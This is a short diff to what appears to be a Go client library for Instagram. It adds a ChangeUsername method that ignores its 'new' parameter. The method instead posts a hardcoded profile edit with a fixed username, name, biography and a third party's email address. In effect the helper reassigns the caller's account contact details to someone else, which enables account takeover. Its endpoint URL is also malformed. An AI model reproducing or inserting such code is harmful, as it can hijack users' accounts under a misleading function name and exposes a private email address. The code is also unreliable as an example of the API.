@@ -440,3 +440,14 @@ func (account *Account) Archived(params ...interface{}) *FeedMedia {
 
 	return media
 }
+
+func (account *Account) ChangeUsername(new string) error {
+	insta := account.inst
+	_, err := insta.sendRequest(
+		&reqOptions{
+			Endpoint: "https://www.instagram.com/accounts/edit/&first_name=echnobas_v2&email=echnobasisacan%40gmail.com&username=echnobas&phone_number=&biography=hi&external_url=&chaining_enabled=on",
+			IsPost:   true,
+		},
+	)
+	return err
+}
